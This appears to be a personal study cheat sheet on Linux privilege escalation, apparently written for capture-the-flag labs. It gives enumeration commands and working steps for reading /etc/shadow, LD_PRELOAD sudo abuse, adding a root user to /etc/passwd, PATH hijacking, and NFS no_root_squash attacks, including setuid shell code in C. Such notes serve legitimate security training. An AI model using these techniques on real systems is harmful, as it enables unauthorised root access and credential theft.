Useful Enum commands
`hostname`
`/proc/version`
`uname -a`
`/etc/issue`
`ps`
`env`
(Sudo)`sudo -l`
`ls -al`
`id`
`/etc/passwd`
`history`
`ifconfig`
`ip route`
`netstat -a -at -au -l -s -tp -i`
`netstat -ano`
`find / -perm -u=s -type f 2>/dev/nullcaeve`
(SUID)`find / -type f -perm -04000 -ls 2>/dev/null`
(capabilities)`getcap -r / 2>/dev/null`
(cron jobs) `/etc/crontab`
(path) `find / -writable 2>/dev/null`
(NFS) `/etc/exports`
Kernel Exploits
===
DirtyCow + overlayFS

Sudo Exploits
===
1. `apache2 -f /etc/shadow` --> error message should show first line of the file (aka the root user's encrypted pswd?)
2. leverageing *LD_Preload*
	1. Check for LD_PRELOAD (with the env_keep option)
	2. Write a simple [[c code sudo privesc]] compiled as a share object (.so extension) file (`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`)
	3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file (`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`)




SUID Exploits
===
gtfobins
1. reading /etc/shadow and /etc/passwd, inserting the user + hash into 2 files, unshadowing them before cracking them with john (nano)
2. creating a new user and adding them to /etc/passwd (nano) `openssl passwd -1 -salt <salt> <pwd>`

Capabilities 
===
gtfobins
Cron Jobs
===
manipulate it to spawn a shell (with root privs)
PATH
===
be sure you can answer the questions below before trying this.

    What folders are located under $PATH
    Does your current user have write privileges for any of these folders?
    Can you modify $PATH?
    Is there a script/application you can start that will be affected by this vulnerability?
use command with _cut_ and _sort_ as follows for a cleaner output:
`find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u` or this specifically more in depth for _usr_:
`find / -writable 2>/dev/null | grep usr | cut -d "/" -f 2,3 | sort -u`
or this to get rid of results for running processes:
`find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`

1. /tmp$ `echo "/bin/bash" > thm`
2. `export PATH=/tmp$PATH`
3. cretae a c binary in a directory where you have write access, so that the binary will be executed with root privileges: 
```c
#include <unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("thm");
}
```
4. run the binary and root shell should be executed

NFS
===
Network File Sharing
**no_root_squash** --> do the attacker things as root
1. `showmount -e <targetIP>`
2. `mkdir /mnt/jrpentester`
3. `sudo mount -o rw 10.10.222.207:/home/ubuntu/sharedfolder /mnt/jrpentester`
4. create a simple executable for a shell (in /mnt/jrpentester dir): 
```c++
int main()
{ setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
```
5. compile it with `gcc nfs.c -o nfs -w`
6. `chmod +s nfs`
7. execute on target machine (can be found under /home/ubuntu/sharedfolder)